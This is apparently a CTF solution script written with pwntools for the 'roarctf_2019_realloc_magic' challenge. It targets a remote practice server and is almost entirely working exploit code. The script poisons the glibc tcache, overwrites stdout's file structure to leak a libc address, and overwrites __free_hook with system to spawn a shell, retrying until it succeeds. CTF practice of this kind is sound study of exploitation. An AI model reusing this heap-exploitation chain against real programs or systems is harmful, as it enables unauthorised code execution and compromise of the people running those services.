# -*- encoding: utf-8 -*-
import sys 
import os 
from pwn import * 
context.log_level = 'debug' 
context.update( os = 'linux', arch = 'amd64',timeout = 1)
binary = './roarctf_2019_realloc_magic'
elf = ELF(binary)
libc = elf.libc
context.binary = binary
DEBUG = 0
if DEBUG:
    p = process(binary)
    #p = process(['qemu-aarch64','-L','',binary])
    #p = process(['qemu-aarch64','-L','',-g,'1234',binary])
else:
    host = 'node4.buuoj.cn'
    port = '26966'
    p = remote(host,port)
l64 = lambda            : u64(p.recvuntil('\x7f')[-6:].ljust(8,'\x00'))
l32 = lambda            : u32(p.recvuntil('\xf7')[-4:].ljust(4,'\x00'))
sla = lambda a,b        : p.sendlineafter(str(a),str(b))
sa  = lambda a,b        : p.sendafter(str(a),str(b))
lg  = lambda name,data  : p.success(name + ': 0x%x' % data)
se  = lambda payload    : p.send(payload)
rl  = lambda            : p.recv()
sl  = lambda payload    : p.sendline(payload)
ru  = lambda a          : p.recvuntil(str(a))
rint= lambda a          : int( p.recv(len(str(a)))[2:] , 16)
def dbg():
    gdb.attach(p)
    pause()

def bgdb(fun):
    gdb.attach(p,'b %s'%fun)

def cmd(num):
    sla('>>',num)

def realloc(size,content):
    cmd(1)
    sla("ize?",size)
    sa("ontent?",content)

def delete():
    cmd(2)

def to_pwn():
    realloc(0x70,'a')
    realloc(0,'')
    realloc(0x100,'b')
    realloc(0,'')
    realloc(0xa0,'c')
    realloc(0,'')

    realloc(0x100,'b')
    for i in range(7):
        delete()

    realloc(0,'')
    realloc(0x70,'a')
    realloc(0x180,'c'*0x78+p64(0x41)+p8(0x60)+p8(0x87))

    realloc(0,'')
    realloc(0x100,'a')
    realloc(0,'')
    realloc(0x100, p64(0xfbad1887) + p64(0)*3 + p8(0x58))
    leak = l64()
    if leak == 0:
        raise EOFError
    lg("leak",leak)
    
    libc.address = leak -0x3e82a0
    free_hook = libc.sym["__free_hook"]
    system_addr = libc.sym["system"]

    cmd(666)
    realloc(0x120,'a')
    realloc(0,'')
    realloc(0x130,'a')
    realloc(0,'')
    realloc(0x170,'a')
    realloc(0,'')

    realloc(0x130,'a')
    for i in range(7):
        delete()

    realloc(0,'')

    realloc(0x120,'a')
    realloc(0x260,'a'*0x128+p64(0x41)+p64(free_hook-8))
    realloc(0,'')
    realloc(0x130,'a')
    realloc(0,'')
    realloc(0x130,'/bin/sh\x00'+p64(system_addr))
    delete()
    #dbg()

    p.interactive()

while True:
    try:
        to_pwn()
    except:
        p.close()
        #p = process(binary)
        p = remote(host,port)
        continue

'''
@File    :   roarctf_2019_realloc_magic.py
@Time    :   2021/07/20 15:52:25
@Author  :   Niyah 
'''